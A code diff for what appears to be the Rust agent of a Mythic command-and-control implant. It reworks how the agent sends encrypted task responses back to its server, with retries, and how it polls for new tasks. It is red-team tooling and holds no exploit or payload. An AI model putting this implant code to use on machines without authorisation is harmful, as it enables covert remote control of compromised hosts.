@@ -4,10 +4,12 @@ use std::thread::sleep;
 use std::time::Duration;
 
 use mythic::{
-    AgentMessageExtras, C2Transport, MythicAgent, MythicError, MythicResult, RespGetTasking,
-    TaskResponse,
+    Aes256HmacCrypto, AgentMessageExtras, AgentResponseExtras, C2Transport, MythicAgent,
+    MythicError, MythicResult, ReqPostResponse, RespGetTasking, TaskResponse, decode_message,
+    decode_message_plain, encode_message, encode_message_plain,
 };
 use rand::seq::SliceRandom;
+use serde::Deserialize;
 use uuid::Uuid;
 
 use crate::config::Config;
@@ -81,17 +83,82 @@ fn get_tasking_with<C: C2Transport>(
     mythic.get_tasking_with(task_size, c2, extras)
 }
 
-fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, pending: Vec<TaskResponse>) {
+#[derive(Debug, Deserialize)]
+struct RichPostResponse {
+    #[allow(dead_code)]
+    action: String,
+    #[serde(default)]
+    responses: Vec<dispatch::PostResponseReceipt>,
+    #[serde(flatten)]
+    #[allow(dead_code)]
+    extras: AgentResponseExtras,
+}
+
+fn post_response_rich<C: C2Transport>(
+    mythic: &MythicAgent,
+    responses: Vec<TaskResponse>,
+    c2: &C,
+) -> MythicResult<RichPostResponse> {
+    let req = ReqPostResponse::new(responses);
+    if let Some(key_b64) = c2.get_aes_psk() {
+        let crypto = Aes256HmacCrypto::from_base64_key(&key_b64)?;
+        let iv = c2.random_iv()?;
+        let packed = encode_message(&req, mythic.callback_uuid(), &crypto, &iv)?;
+        let response = c2.post_response(&packed)?;
+        decode_message(&response, Some(mythic.callback_uuid()), &crypto).map(|(_, r)| r)
+    } else {
+        let packed = encode_message_plain(&req, mythic.callback_uuid())?;
+        let response = c2.post_response(&packed)?;
+        decode_message_plain(&response, Some(mythic.callback_uuid())).map(|(_, r)| r)
+    }
+}
+
+fn post_pending_once<C: C2Transport>(
+    mythic: &MythicAgent,
+    c2: &C,
+    pending: &mut Vec<TaskResponse>,
+) -> MythicResult<()> {
+    if pending.is_empty() {
+        return Ok(());
+    }
+    let batch = std::mem::take(pending);
+    let cloned_for_retry = batch.clone();
+    match post_response_rich(mythic, batch, c2) {
+        Ok(receipt) => {
+            pending.extend(dispatch::responses_from_post_response_receipts(
+                &receipt.responses,
+            ));
+            Ok(())
+        }
+        Err(e) => {
+            pending.extend(cloned_for_retry);
+            Err(e)
+        }
+    }
+}
+
+fn post_pending_until_drained<C: C2Transport>(
+    mythic: &MythicAgent,
+    c2: &C,
+    pending: &mut Vec<TaskResponse>,
+) -> MythicResult<()> {
+    for _ in 0..8 {
+        if pending.is_empty() {
+            return Ok(());
+        }
+        post_pending_once(mythic, c2, pending)?;
+    }
+    Ok(())
+}
+
+fn flush_pending<C: C2Transport>(mythic: &MythicAgent, c2: &C, mut pending: Vec<TaskResponse>) {
     if pending.is_empty() {
         return;
     }
     let total = pending.len();
     info!("[*] flushing {} response(s) before exit", total);
-    // Retry up to 3 times, but each attempt needs a fresh Vec clone because
-    // get_tasking_with moves it.
     for attempt in 1..=3u32 {
-        let attempt_vec = pending.clone();
-        match get_tasking_with(mythic, 5, c2, attempt_vec) {
+        match post_pending_until_drained(mythic, c2, &mut pending) {
             Ok(_) => return,
             Err(e) => {
                 if DEBUG.load(Ordering::Relaxed) {
@@ -174,6 +241,11 @@ pub fn run(config: Config) -> MythicResult<()> {
         }
         return Ok(());
     }
+    if profiles.iter().any(|p| p.encrypted_exchange_check()) {
+        return Err(MythicError::protocol(
+            "encrypted_exchange_check is configured but not implemented",
+        ));
+    }
 
     // Wire per-profile flags (currently: external_ip_check) into the metadata
     // module so the easy_checkin call below honours the operator's intent.
@@ -231,12 +303,15 @@ pub fn run(config: Config) -> MythicResult<()> {
         sleep_with_jitter();
         let c2 = profiles.choose(&mut rng).unwrap();
 
-        // Move pending into the request. The Err branch needs the
-        // responses back, so clone first; the Ok branch can keep them
-        // and avoid the second allocation by moving into the call.
-        let batch = std::mem::take(&mut pending);
-        let cloned_for_retry = batch.clone();
-        match get_tasking_with(&mythic, 5, c2, batch) {
+        if let Err(e) = post_pending_until_drained(&mythic, c2, &mut pending) {
+            if DEBUG.load(Ordering::Relaxed) {
+                eprintln!("[!] post_response failed: {e}");
+            }
+            sleep(Duration::from_secs(5));
+            continue;
+        }
+
+        match get_tasking_with(&mythic, 5, c2, Vec::new()) {
             Ok(tasking) => {
                 if DEBUG.load(Ordering::Relaxed) {
                     info!("task: {:?}", tasking);
@@ -256,11 +331,6 @@ pub fn run(config: Config) -> MythicResult<()> {
                 if DEBUG.load(Ordering::Relaxed) {
                     eprintln!("[!] get_tasking failed: {e}");
                 }
-                // Re-queue everything we tried to send so the next round
-                // re-attempts. Note: this can grow pending on a sustained
-                // outage — operators should expect the agent to back off
-                // gracefully via the 5s sleep below.
-                pending.extend(cloned_for_retry);
                 sleep(Duration::from_secs(5));
             }
         }
